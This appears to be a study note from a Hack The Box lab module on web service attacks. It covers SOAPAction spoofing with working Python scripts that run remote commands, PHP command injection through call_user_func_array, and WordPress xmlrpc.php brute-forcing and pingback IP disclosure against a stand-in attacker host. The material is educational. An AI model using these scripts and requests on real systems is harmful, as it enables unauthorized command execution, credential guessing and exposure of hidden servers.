# Web Service Attacks

## SOAPAction Spoofing

SOAP messages towards a SOAP service should include both the operation and the related parameters. This operation resides in the first child element of the SOAP message's body. If HTTP is the transport of choice, it is allowed to use an additional HTTP header called SOAPAction, which contains the operation's name. The receiving web service can identify the operation within the SOAP body through this header without parsing any XML.

If a web service considers only the SOAPAction attribute when determining the operation to execute, then it may be vulnerable to SOAPAction spoofing.

### Example

Suppose you are accessing a SOAP web service, whose WSDL file resides in ```http://<TARGET IP>:3002/wsdl?wsdl```.

The service's WSDL file can be found below:

```bash
d41y@htb[/htb]$ curl http://<TARGET IP>:3002/wsdl?wsdl 

<?xml version="1.0" encoding="UTF-8"?>
<wsdl:definitions targetNamespace="http://tempuri.org/" 
  xmlns:s="http://www.w3.org/2001/XMLSchema" 
  xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/" 
  xmlns:http="http://schemas.xmlsoap.org/wsdl/http/" 
  xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/" 
  xmlns:tns="http://tempuri.org/" 
  xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" 
  xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/" 
  xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" 
  xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">
  
  <wsdl:types>
    
    
    <s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
      
      
      
      <s:element name="LoginRequest">
        
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
            <s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
          </s:sequence>
        </s:complexType>
        
      </s:element>
      
      
      <s:element name="LoginResponse">
        
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      
      
      <s:element name="ExecuteCommandRequest">
        
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
          </s:sequence>
        </s:complexType>
        
      </s:element>
      
      <s:element name="ExecuteCommandResponse">
        
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
          </s:sequence>
        </s:complexType>
        
      </s:element>
      
      
      
    </s:schema>
    
    
  </wsdl:types>
  
  
  
  
  <!-- Login Messages -->
  <wsdl:message name="LoginSoapIn">
    
    <wsdl:part name="parameters" element="tns:LoginRequest"/>
    
  </wsdl:message>
  
  
  <wsdl:message name="LoginSoapOut">
    
    <wsdl:part name="parameters" element="tns:LoginResponse"/>
    
  </wsdl:message>
  
  
  <!-- ExecuteCommand Messages -->
  <wsdl:message name="ExecuteCommandSoapIn">
    
    <wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>
    
  </wsdl:message>
  
  
  <wsdl:message name="ExecuteCommandSoapOut">
    
    <wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>
    
  </wsdl:message>
  
  
  
  
  
  <wsdl:portType name="HacktheBoxSoapPort">
    
    
    <!-- Login Operaion | PORT -->
    <wsdl:operation name="Login">
      
      <wsdl:input message="tns:LoginSoapIn"/>
      <wsdl:output message="tns:LoginSoapOut"/>
      
    </wsdl:operation>
    
    
    <!-- ExecuteCommand Operation | PORT -->
    <wsdl:operation name="ExecuteCommand">
      
      <wsdl:input message="tns:ExecuteCommandSoapIn"/>
      <wsdl:output message="tns:ExecuteCommandSoapOut"/>
      
    </wsdl:operation>
    
  </wsdl:portType>
  
  
  
  
  
  <wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
    
    
    <soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
    
    <!-- SOAP Login Action -->
    <wsdl:operation name="Login">
      
      <soap:operation soapAction="Login" style="document"/>
      
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
      
    </wsdl:operation>
    
    
    <!-- SOAP ExecuteCommand Action -->
    <wsdl:operation name="ExecuteCommand">
      <soap:operation soapAction="ExecuteCommand" style="document"/>
      
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
    
    
  </wsdl:binding>
  
  
  
  
  
  <wsdl:service name="HacktheboxService">
    
    
    <wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
      <soap:address location="http://localhost:80/wsdl"/>
    </wsdl:port>
    
    
  </wsdl:service>
  
  
  
  
  
</wsdl:definitions>
```

The first thing to pay attention to is the following:

```xml
<wsdl:operation name="ExecuteCommand">
<soap:operation soapAction="ExecuteCommand" style="document"/>
```

You can see a SOAPAction operation called ```ExecuteCommand```.

Take a look at the params:

```xml
<s:element name="ExecuteCommandRequest">
<s:complexType>
<s:sequence>
<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
```

You notice that there is a ```cmd``` parameter. The below script will try to have the SOAP service execute a ```whoami``` command:

```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

When executed:

```bash
d41y@htb[/htb]$ python3 client.py
b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandResponse xmlns="http://tempuri.org/"><success>false</success><error>This function is only allowed in internal networks</error></ExecuteCommandResponse></soap:Body></soap:Envelope>'
```

You get an error mentioning "This function is only allowed in internal networks". You have no access to the internal networks. Try a SOAPAction spoofing attack, as follows:

```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

- you specify ```LoginRequest``` in ```<soap:body>```, so that your request goes through; this operation is allowed from the outside
- you specify the parameters of ```ExecuteCommand``` because you want to have the SOAP service execute a ```whoami``` command
- you specify the blocked operation (_```ExecuteCommand```_) in the SOAPAction header

If the web service determines the operation to be executed based solely on the SOAPAction header, you may bypass the restrictions and have the SOAP service execute a ```whoami``` command.

When executed:

```bash
d41y@htb[/htb]$ python3 client_soapaction_spoofing.py
b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><success>true</success><result>root\n</result></LoginResponse></soap:Body></soap:Envelope>'
```

The ```whoami``` command executed successfully, bypassing the restrictions through SOAPAction spoofing!

If you want to be able to specify mulitple commands and see the result each time, use the following Python script:

```python
import requests

while True:
    cmd = input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

## Command Injection

### Example

Suppose you are accessing a connectivity-checking service residing in ```http://<TARGET IP>:3003/ping-server.php/ping```. Suppose you have also been provided with the source code of the service.

```php
<?php
function ping($host_url_ip, $packets) {
        if (!in_array($packets, array(1, 2, 3, 4))) {
                die('Only 1-4 packets!');
        }
        $cmd = "ping -c" . $packets . " " . escapeshellarg($host_url_ip);
        $delimiter = "\n" . str_repeat('-', 50) . "\n";
        echo $delimiter . implode($delimiter, array("Command:", $cmd, "Returned:", shell_exec($cmd)));
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $prt = explode('/', $_SERVER['PATH_INFO']);
        call_user_func_array($prt[1], array_slice($prt, 2));
}
?>
```

- a function called _ping_ is defined, which takes two arguments _host\_url\_ip_ and _packets_; the request should look similar to ```http://<TARGET IP>:3003/ping-server.php/ping/<VPN/TUN Adapter IP>/3```
- the code also checks if the _packets_'s value is more than 4, and it does that via an array
- a variable called _cmd_ is then created, which forms the ping command to be executed; two values are "parsed", _packets_ and _host\_url_

>[!NOTE]
> _escapeshellarg()_ adds single quotes around a string and quotes/escapes any existing single quotes allowing you to pass a string directly to a shell function and having it be treated as a single safe argument.<br>
> This function should be used to escape individual arguments to shell functions coming from user input.<br>
> The shell functions include exec(), system(), shell_exec() and the backtick operator.<br>
> If the _host\_url_'s value was not escaped, easy command injection could happen.

- the command specified by the _cmd_ parameter is executed with the help of the shell_exec() PHP function
- if the request method is GET, an existing function can be called with the help of call_user_func_array(); the call_user_func_array() function is a special way to call an existing PHP function; it takes a function to call as its first parameter, then takes an array of parameters as its second parameter; this means that instead of ```http://<TARGET IP>:3003/ping-server.php/ping/www.example.com/3``` an attacker could issue a request as ```http://<TARGET IP>:3003/ping-server.php/system/ls``

```bash
d41y@htb[/htb]$ curl http://<TARGET IP>:3003/ping-server.php/system/ls
index.php
ping-server.php
```

## Attacking WordPress _xmlrpc.php_

### Example

Suppose you are assessing the security of a WordPress instance residing in ```http://blog.inlanefreight.com```. Through enumeration activities, you identified a valid username, ```admin```, and that ```xmlrpc.php``` is enabled. Identifying if ```xmlrpc.php``` is enabled is as easy as requesting ```xmlrpc.php``` on the domain you are assessing.

You can mount a password brute-forcing attack through ```xmlrpc.php```:

```bash
d41y@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://blog.inlanefreight.com/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
  <member><name>xmlrpc</name><value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

Above, you can see a successful login attempt through ```xmlrpc.php```.

You will receive a ```403 faultCode``` error if the creds are not valid.

```bash
d41y@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>WRONG-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>403</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>Incorrect username or password.</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

You identified the correct method to call by going through the well-documented [WordPress code](https://codex.wordpress.org/XML-RPC/system.listMethods) and interacting with ```xmlrpc.php```:

```bash
d41y@htb[/htb]$ curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
  <value><string>mt.getTrackbackPings</string></value>
  <value><string>mt.supportedTextFilters</string></value>
  <value><string>mt.supportedMethods</string></value>
  <value><string>mt.setPostCategories</string></value>
  <value><string>mt.getPostCategories</string></value>
  <value><string>mt.getRecentPostTitles</string></value>
  <value><string>mt.getCategoryList</string></value>
  <value><string>metaWeblog.getUsersBlogs</string></value>
  <value><string>metaWeblog.deletePost</string></value>
  <value><string>metaWeblog.newMediaObject</string></value>
  <value><string>metaWeblog.getCategories</string></value>
  <value><string>metaWeblog.getRecentPosts</string></value>
  <value><string>metaWeblog.getPost</string></value>
  <value><string>metaWeblog.editPost</string></value>
  <value><string>metaWeblog.newPost</string></value>
  <value><string>blogger.deletePost</string></value>
  <value><string>blogger.editPost</string></value>
  <value><string>blogger.newPost</string></value>
  <value><string>blogger.getRecentPosts</string></value>
  <value><string>blogger.getPost</string></value>
  <value><string>blogger.getUserInfo</string></value>
  <value><string>blogger.getUsersBlogs</string></value>
  <value><string>wp.restoreRevision</string></value>
  <value><string>wp.getRevisions</string></value>
  <value><string>wp.getPostTypes</string></value>
  <value><string>wp.getPostType</string></value>
  <value><string>wp.getPostFormats</string></value>
  <value><string>wp.getMediaLibrary</string></value>
  <value><string>wp.getMediaItem</string></value>
  <value><string>wp.getCommentStatusList</string></value>
  <value><string>wp.newComment</string></value>
  <value><string>wp.editComment</string></value>
  <value><string>wp.deleteComment</string></value>
  <value><string>wp.getComments</string></value>
  <value><string>wp.getComment</string></value>
  <value><string>wp.setOptions</string></value>
  <value><string>wp.getOptions</string></value>
  <value><string>wp.getPageTemplates</string></value>
  <value><string>wp.getPageStatusList</string></value>
  <value><string>wp.getPostStatusList</string></value>
  <value><string>wp.getCommentCount</string></value>
  <value><string>wp.deleteFile</string></value>
  <value><string>wp.uploadFile</string></value>
  <value><string>wp.suggestCategories</string></value>
  <value><string>wp.deleteCategory</string></value>
  <value><string>wp.newCategory</string></value>
  <value><string>wp.getTags</string></value>
  <value><string>wp.getCategories</string></value>
  <value><string>wp.getAuthors</string></value>
  <value><string>wp.getPageList</string></value>
  <value><string>wp.editPage</string></value>
  <value><string>wp.deletePage</string></value>
  <value><string>wp.newPage</string></value>
  <value><string>wp.getPages</string></value>
  <value><string>wp.getPage</string></value>
  <value><string>wp.editProfile</string></value>
  <value><string>wp.getProfile</string></value>
  <value><string>wp.getUsers</string></value>
  <value><string>wp.getUser</string></value>
  <value><string>wp.getTaxonomies</string></value>
  <value><string>wp.getTaxonomy</string></value>
  <value><string>wp.getTerms</string></value>
  <value><string>wp.getTerm</string></value>
  <value><string>wp.deleteTerm</string></value>
  <value><string>wp.editTerm</string></value>
  <value><string>wp.newTerm</string></value>
  <value><string>wp.getPosts</string></value>
  <value><string>wp.getPost</string></value>
  <value><string>wp.deletePost</string></value>
  <value><string>wp.editPost</string></value>
  <value><string>wp.newPost</string></value>
  <value><string>wp.getUsersBlogs</string></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

Inside the list of availabe methods above, ```pingback.ping``` is included. It allows for XML-RPC pingbacks. According to WordPress, a pingback is a special type of comment that's created when you link to another blog post, as long as the other blog is set to accept pingbacks.

Unfortunately, if pingbacks are available, they can facilitate:

- IP disclosure
  - an attacker can call the ```pingback.ping``` method on a WordPress instance behind Cloudflare to identify its public IP; the pingback should point to an attacker-controlled host accessible by the WordPress instance
- Cross-Site Port Attack (_XSPA_)
  - an attacker can clal the ```pingback.ping``` method on a WordPress instance against itself on different ports; open ports or internal hosts can be identified by looking for response time differences or response differences
- DDoS
  - an attacker cann call the ```pingback.ping``` method on numerous WordPress instances against a single target

#### IP Disclosure

Suppose that the WordPress instance residing in ```http://blog.inlanefreight.com``` is protected by Cloudflare. You identified ```xmlrpc.php``` and ```pingback.ping``` is available.

As soon as the below request is sent, the attacker-controlled host will receive a request originating from ```http://blog.inlanefreight.com```, verifying the pingback and exposing ```http://blog.inlanefreight.com```'s public IP address.

```http
--> POST /xmlrpc.php HTTP/1.1 
Host: blog.inlanefreight.com 
Connection: keep-alive 
Content-Length: 293

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://attacker-controlled-host.com/</string></value>
</param>
<param>
<value><string>https://blog.inlanefreight.com/2015/10/what-is-cybersecurity/</string></value>
</param>
</params>
</methodCall>
```